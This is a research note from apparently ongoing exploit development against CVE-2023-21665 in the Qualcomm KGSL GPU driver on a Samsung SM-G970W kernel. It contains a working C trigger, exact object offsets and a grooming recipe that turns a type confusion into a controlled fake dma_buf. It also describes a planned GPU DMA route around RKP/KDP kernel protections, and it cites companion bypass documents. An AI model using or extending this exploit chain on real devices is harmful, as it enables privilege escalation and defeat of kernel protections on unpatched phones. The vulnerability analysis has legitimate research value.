# CVE-2023-21665 — verified reachable/exploitable on SM-G970W (msm-4.14)

Status: **VERIFIED on-device** (kernel Oops driven from userspace through the exact
vulnerable path). Companion to `docs/DEFEX_BYPASS.md` / `docs/RKP_REFERENCES.md`.

## The bug

`drivers/gpu/msm/kgsl.c` (this device's ROM):

```c
/* kgsl_setup_dmabuf_useraddr() */
vma = find_vma(current->mm, hostptr);
if (vma && vma->vm_file) {
        ... check_vma_flags() ...           // needs a writable VMA (VM_READ|VM_WRITE)
        if (vma->vm_file->f_op == &kgsl_fops) return -EFAULT;
        get_file(vma->vm_file);
        dmabuf = vma->vm_file->private_data;   /* <-- unchecked cast to struct dma_buf * */
}
if (IS_ERR_OR_NULL(dmabuf)) return ...;
ret = kgsl_setup_dma_buf(device, pagetable, entry, dmabuf);  /* uses it as a real dma_buf */
```

Reachable from any process that can open `/dev/kgsl-3d0` (mode `crw-rw-rw-`) via
`IOCTL_KGSL_MAP_USER_MEM` with `KGSL_USER_MEM_TYPE_ADDR`:

`kgsl_ioctl_map_user_mem` -> `_map_usermem_addr` -> `kgsl_setup_useraddr` ->
`kgsl_setup_dmabuf_useraddr` (the cast).

`CONFIG_DMA_SHARED_BUFFER=y` (verified), and this firmware's `security_patch` is
`2023-03-01`; the fix shipped in the **May-2023** Android/Qualcomm bulletin, so the
bug is **unpatched here**. It is a type confusion: any mmap-able file whose
`vm_file->private_data` is non-NULL and not a `dma_buf` (e.g. a char-device driver
that stores its own per-open struct in `file->private_data`) can be substituted.

Note `/dev/ashmem` does **not** work: `ashmem_mmap` sets `vma->vm_file = asma->file`
(the shmem backing file, `private_data == NULL`) -> -ENODEV -> the anon fallback.
`/dev/binder` does **not** work: `binder_mmap` rejects `VM_WRITE`
(`FORBIDDEN_MMAP_FLAGS = VM_WRITE`) so `check_vma_flags()` fails first.

## The PoC (trigger)

`/dev/uio0` (uio "rmtfs", 2 MiB map, mode 0660 system) stores a
`struct uio_listener *` in `file->private_data` and allows a writable MAP_SHARED
VMA -> it passes `check_vma_flags()` and supplies a non-dma_buf object.

```c
int mf = open("/dev/uio0", O_RDWR);
void *p = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE, MAP_SHARED, mf, 0);
int gf = open("/dev/kgsl-3d0", O_RDWR);
struct kgsl_map_user_mem m = { .fd = mf, .len = 0x2000,
                               .hostptr = (unsigned long)p,
                               .memtype = KGSL_USER_MEM_TYPE_ADDR /* 2 */ };
ioctl(gf, IOCTL_KGSL_MAP_USER_MEM /* _IOWR(0x09,0x15,..) */, &m);
```

(Access to `/dev/uio0` needs uid 0 / group system here; the KGSL ioctl itself needs
no privilege.  `scripts/runroot.sh` was used to run the PoC as root.)

## Why this matters (next step toward DMA / stronger root)

* KGSL operates on **physical pages / IOMMU page tables**. Once an object is treated
  as a `dma_buf`, `kgsl_setup_dma_buf()` proceeds to `dma_buf_map_attachment()` and
  builds an `sg_table` from it, and stores it in the memdesc — a route to controlling
  GPU-visible mappings. That is the same class of primitive as the modern
  "dirty pagetable / GPU DMA" chains (Jamf 2026) which bypass RKP/KDP because **DMA
  does not pass through the CPU's stage-2 translation**.
* Current state: a **controlled kernel Oops** (the fake object's fields are read).
  To weaponise: heap-groom the victim object (`file->private_data`) so that
  `dmabuf->lock` is a valid unlocked mutex and `dmabuf->ops` points to controlled
  memory — then `dma_buf_attach`/`dma_buf_map_attachment` act on attacker data.
* An **app-accessible** trigger (no uid 0) would need an mmap-able, writable,
  non-dma_buf device file reachable from `untrusted_app` (candidates on this ROM:
  `/dev/video*` camera (group `camera`), `/dev/dri/renderD128` (`graphics_device`)).
  `/dev/uio0` and `/dev/mobicore` are privileged.

## Weaponisation progress (in-process DRM victim)

Building on the verified trigger, we now **control the type-confused object**. The
weaponisation uses a **shell-openable victim** — no root/helper needed:

* open `/dev/dri/renderD128` (world-rw; allowed once SELinux is permissive),
* `DRM_IOCTL_MODE_CREATE_DUMB` + `DRM_IOCTL_MODE_MAP_DUMB` + `mmap` -> a writable
  `MAP_SHARED` VMA whose `vma->vm_file->private_data` is a `struct drm_file`
  (non-`dma_buf`). (`DRM_IOCTL_MSM_GEM_NEW` fails on the render node with EINVAL; the
  dumb-buffer path works.)
* locate that object via arbitrary kernel R/W: task-(+0x880)->files,
  files-(+0x20)->fdt, fdt-(+0x8)->fd[], fd[fd]->file, file-(+0xd0)->private_data
  (offsets confirmed against the WSL ROM source, not the NTFS copy),
* **groom** it: `attachments.next/prev = &attachments` (self-linked, offset 16/24),
  `lock = 0` (offset 40), `ops =` a zeroed fake `dma_buf_ops` table (offset 32),
* fire `IOCTL_KGSL_MAP_USER_MEM(ADDR, hostptr=that VMA)`.

Result (single exploit run, `fops.c` hook `KGSL_DRM=1`):

```
kgsl_drm: create_dumb=0 map_dumb=0 off=0x100000000 size=16384
kgsl_drm: priv=ffffffc03555b000
kgsl_drm: patched [00 00 attachments=self ops=ffffff800abde160 lock=0 ...]
kgsl_drm: firing KGSL ioctl ...
PANIC: Oops PC:jopp_springboard_blr_x8+0x4/0x48  LR:dma_buf_map_attachment+0x24/0x58
```

So the wall moved from `mutex_lock(&dmabuf->lock)` (before the groom) all the way to
`dma_buf_map_attachment` calling `dmabuf->ops->map_dma_buf(...)` — an **indirect call
dispatched through the JOPP CFI springboard** (`jopp_springboard_blr_x8`). The crash is
only because the fake op is NULL. The object is now fully controlled; the next step is
to place a **valid** `map_dma_buf` (e.g. borrowed from a real dma-buf we create) and a
crafted `priv`, so `dma_buf_map_attachment` returns an attacker-controlled `sg_table`
that KGSL installs into `entry->memdesc.sgt` and maps for the GPU (the DMA / RKP-bypass
primitive).
